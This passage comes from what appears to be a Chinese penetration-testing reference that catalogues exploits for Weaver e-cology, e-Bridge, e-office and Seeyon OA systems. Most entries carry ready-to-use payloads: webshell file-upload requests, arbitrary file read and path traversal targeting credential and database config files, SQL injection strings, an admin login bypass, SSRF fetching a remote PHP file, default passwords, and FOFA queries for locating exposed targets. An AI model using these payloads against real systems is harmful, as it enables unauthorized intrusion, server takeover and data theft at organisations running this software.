    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://x.x.x.x/
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
    Connection: close
    ------WebKitFormBoundaryFy3iNVBftjP6IOwo
    Content-Disposition: form-data; name="file"; filename="12.jsp"
    Content-Type: application/octet-stream
    ------WebKitFormBoundaryFy3iNVBftjP6IOwo--
    ```
    ```
    page/exportImport/fileTransfer/12.jsp
    ```
**泛微OA V9 E-Cology WorkflowServiceXml RCE**
- 描述
    泛微 E-cology OA 系统的 WorkflowServiceXml 接口可被未授权访问，攻击者调用该接口，可构造特定的 HTTP 请求绕过泛微本身一些安全限制从而达成远程代码执行
- 相关文章
    - [E-Cology WorkflowServiceXml RCE](https://mp.weixin.qq.com/s/DVlZC5jU6MQQqUoM2gKTBg)
    - [泛微E-Cology WorkflowServiceXml RCE](http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology%20WorkflowServiceXml%20RCE.html?h=%E6%B3%9B%E5%BE%AEE-Cology%20WorkflowServiceXml%20RCE)
    - [HVV行动之某OA流量应急](https://mp.weixin.qq.com/s/68sQAkT3CBff4Y40OPJvxQ)
    - [微某OA从0day流量分析到武器化利用](https://mp.weixin.qq.com/s/iTP9jBypsJEsSlAIaNOnhw)
    - [泛微 WorkflowServiceXml RCE 复现](https://www.o2oxy.cn/3561.html)
**泛微OA weaver.common.Ctrl 任意文件上传漏洞**
- 描述
    泛微 OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传 webshell 文件控制服务器
- 相关文章
    - [泛微OA weaver.common.Ctrl 任意文件上传漏洞](https://mp.weixin.qq.com/s/ePYRFPfu-pvWMKSiffporA)
    - [泛微OA 前台GetShell复现](https://ailiqun.xyz/2021/05/02/%E6%B3%9B%E5%BE%AEOA-%E5%89%8D%E5%8F%B0GetShell%E5%A4%8D%E7%8E%B0/)
    - [HVV 某OA文件上传漏洞分析](https://mp.weixin.qq.com/s/wX0cCMaCM9UhP6F4MxdeKQ)
**com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction 任意文件上传**
- 相关文章
    - [泛微e-cology任意文件上传(已修复)](https://mp.weixin.qq.com/s/3ip7-U8BsWgq3N4SP5xd4w)
**weaver.workflow.exceldesign.ExcelUploadServlet 任意文件上传**
- 相关文章
    - [泛微e-cology另一接口任意文件上传(已修复)](https://mp.weixin.qq.com/s/nRnNyFfDQYxmFwA-7-IBVQ)
**/workrelate/plan/util/uploaderOperate.jsp + /OfficeServer 文件上传**
- POC | Payload | exp
    - https://github.com/sobinge/2022-HW-POC/blob/main/%E6%B3%9B%E5%BE%AEOA%20uploaderOperate.jsp%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
**管理员任意登录**
- POC | Payload | exp
    ```
    /mobile/plugin/VerifyQuickLogin.jsp
    identifier=1&language=1&ipaddress=
    ```
#### e-bridge
> fofa: app="泛微-云桥 e-Bridge"
**泛微云桥 /wxjsapi/saveYZJFile 任意文件读取**
- 描述
    未授权任意文件读取,/wxjsapi/saveYZJFile 接口获取 filepath,返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。
- 相关文章
    - [泛微云桥-任意文件读取深入利用](https://mp.weixin.qq.com/s/BwJJPf5S-SKzChuDGl9i5w)
- POC | Payload | exp
    ```
    downloadUrl 参数修改成需要获取文件的绝对路径,记录返回包中的 id 值
    /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c:windows/win.ini&fileExt=txt
    ```
    通过查看文件接口访问 /file/fileNoLogin/id
    ```
    /file/fileNoLogin/xxxxxxxxxxxxxxxxx
    ```
    参考安识科技 A-Team 利用方法,https://mp.weixin.qq.com/s/Y_2_e7HIWH3z5jhMsK7pZA
    ```
    参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”
    /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///D:/&fileExt=txt
    常见路径
    d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties
    d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库
    ```
#### e-office
> fofa: app="泛微-EOffice"
**指纹**
- `/general/login/index.php`
**相关文章**
- [【攻防演练】某协同办公系统多个1day分析过程](https://forum.butian.net/share/1791)
- [E-office Server_v9.0 漏洞分析](https://mp.weixin.qq.com/s/JP-kIsWeQ0HZPs9jZjL24A)
**E-Office officeserver.php 任意文件读取漏洞**
- POC | Payload | exp
    ```
    /iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=xxxx.txt
    ```
**CNVD-2021-49104 E-Office v9 任意文件上传漏洞**
- 相关文章
    - [某 E-Office v9 任意文件上传漏洞复现](https://www.o2oxy.cn/3860.html)
    - [某office前台任意文件上传漏洞分析](https://mp.weixin.qq.com/s/lOgOXHmtUGaqN4c3_7_WhQ)
    - [记一次PHP文件上传WAF+沙盒绕过](https://www.o2oxy.cn/4095.html)
- POC | Payload | exp
    - [bigsizeme/CNVD-2021-49104](https://github.com/bigsizeme/CNVD-2021-49104)
**E-Office v9 任意文件下载漏洞**
- POC | Payload | exp
    ```
    /inc/attach.php?path=/../../../../../1.txt
    ```
**E-office do_excel.php任意文件写入漏洞**
- POC | Payload | exp
    ```
    /WWW/general/charge/charge_list/do_excel.php
    html=
    ```
**eoffice10 前台 OfficeServer getshell**
- POC | Payload | exp
    查看版本 /eoffice10/version.json
    ```
    上传 
    ```
    ```
    POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
    Host: XXXXXXXX:8010
    Content-Length: 378
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: null
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/91.0.4472.77 Safari/537.36
    Accept:
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/
    *;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
    Connection: close
    ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
    Content-Disposition: form-data; name="FileData"; filename="1.jpg"
    Content-Type: image/jpeg
    ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
    Content-Disposition: form-data; name="FormData"
    {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
    ------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
    ```
    http://XXXXXXXX:8010/eoffice10/server/public/iWebOffice2015/Document/test.php
**ajax.php 任意文件上传**
- POC | Payload | exp
    ```
    /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save
    后缀 xxx.php.
    /attachment/xxxxx.php
    ```
**ajax.php 全回显SSRF可RCE**
- POC | Payload | exp
    ```
    /E-mobile/App/Ajax/ajax.php?action=dingtalkImg&result[]=http://x.x.x.x/1.php
    /attachment/xxxxx.php
    ```
**downfile.php 回显SSRF**
- POC | Payload | exp
    ```
    /E-mobile/App/System/File/downfile.php?url=
    Host: www.baidu.com
    ```
---
### 致远
> 官网 : http://www.seeyon.com/
> Fofa : app="致远互联-OA"
**相关文章**
- [致远A8数据库密码解密](https://www.cmdhack.com/archives/212.html)
- [Seeyon A8 登录hash破解案例](https://www.hedysx.com/2807.html)
**相关工具**
- [Summer177/seeyon_exp](https://github.com/Summer177/seeyon_exp)
- [nex121/SeeyonEXP](https://github.com/nex121/SeeyonEXP)
- [Rvn0xsy/PassDecode-jar](https://github.com/Rvn0xsy/PassDecode-jar) - 帆软/致远密码解密工具
- [z1un/seeyou_exp](https://github.com/z1un/seeyou_exp)
**致远OA数据库配置文件**
```
/opt/Seeyon/A8/base/conf/datasourceCtp.properties
```
**指纹**
- `/seeyon/htmlofficeservlet`
- `/seeyon/index.jsp`
- `seeyon`
**默认口令**
```
system/system
group-admin/123456
admin1/123456
gov-admin/123456
audit-admin/123456
```
**致远OA Session泄漏漏洞**
需登录账户,注入发生在search_result.jsp文件中的docTitle参数
- POC | Payload | exp
    ```
    /yyoa/ext/https/getSessionList.jsp?cmd=getAll
    ```
**致远OA A6 search_result.jsp sql注入漏洞**
- POC | Payload | exp
    ```
    /yyoa/oaSearch/search_result.jsp?docType=协同信息&docTitle=1'and/**/1=2/**/ union/**/all/**/select/**/user(),2,3,4,5%23&goal=1&perId=0&startTime=&endTime=&keyword=&searchArea=notArc
    ```
**致远OA A6 setextno.jsp sql注入漏洞**
- POC | Payload | exp
    ```
    /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23
    ```
**致远OA A6 重置数据库账号密码漏洞**
- POC | Payload | exp
    ```
    /yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids=(17) union all select user()%23{'success':false,'errors':'root@localhost'}
    ```
**致远OA A6 敏感信息泄露**
- POC | Payload | exp
    ```
    /yyoa/createMysql.jsp
    /yyoa/ext/createMysql.jsp
    /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0
    ```
**致远 OA A6 test.jsp sql 注入漏洞**
- 相关文章
    - [用友致远A6 OA存在sql注入并拿shell](https://www.pa55w0rd.online/yyoa/)
    - [致远OA A6 test.jsp SQL注入漏洞](https://fengchenzxc.github.io/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/)
- POC | Payload | exp
    ```
    /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())
    /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)
    ```
**致远OA A8 未授权访问**
- POC | Payload | exp
    ```
    /seeyon/main.do?method=officeDown&filename=c:/boot.ini
    ```
**致远OA A8 任意用户密码修改漏洞**
- 相关文章
    - [申通快递某系统存在任意用户密码修改漏洞 -wooyun-2016-0215609](https://www.onebug.org/wooyundata/74171.html)
    - [风行在线某系统任意用户密码重置漏洞(管理员账号为例/涉及内部架构/文件等敏感信息) -wooyun-2016-0213554](https://www.onebug.org/wooyundata/74123.html)